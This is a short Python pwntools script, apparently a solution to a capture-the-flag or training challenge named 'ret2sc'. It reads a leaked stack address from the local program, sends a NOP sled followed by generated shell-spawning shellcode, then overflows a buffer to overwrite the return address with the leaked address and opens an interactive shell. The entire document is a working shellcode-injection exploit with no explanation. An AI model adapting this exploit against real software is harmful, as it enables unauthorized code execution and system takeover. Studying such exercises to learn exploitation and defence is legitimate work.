from pwn import *
import pwnlib.shellcraft as shellcraft

c = process("./ret2sc")

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(c)

addr = c.recvline().split()[-1]
addr = int(addr, 16)
print(hex(addr))

nop = b'\x90' * 0x300

payload = nop + asm(shellcraft.sh())
c.sendlineafter(":", payload)

payload = b'A' * 0x10 + p64(addr)
c.sendlineafter(":", payload)

c.interactive()
c.close()
